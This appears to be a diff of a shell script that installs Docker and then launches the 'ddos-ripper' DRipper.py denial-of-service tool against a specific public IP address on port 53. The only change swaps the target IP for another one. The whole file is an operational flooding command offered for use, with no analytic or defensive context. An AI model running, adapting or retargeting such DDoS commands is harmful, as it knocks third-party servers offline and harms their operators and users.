@@ -15,4 +15,4 @@ sudo apt-get update
 
 sudo apt-get install -y docker-ce docker-ce-cli containerd.io
 
-sudo docker run --rm -i --entrypoint=python3 nitupkcuf/ddos-ripper DRipper.py -s 194.67.7.1 -p 53 -t 135 -q 10000
+sudo docker run --rm -i --entrypoint=python3 nitupkcuf/ddos-ripper DRipper.py -s 194.54.14.187  -p 53 -t 135 -q 10000
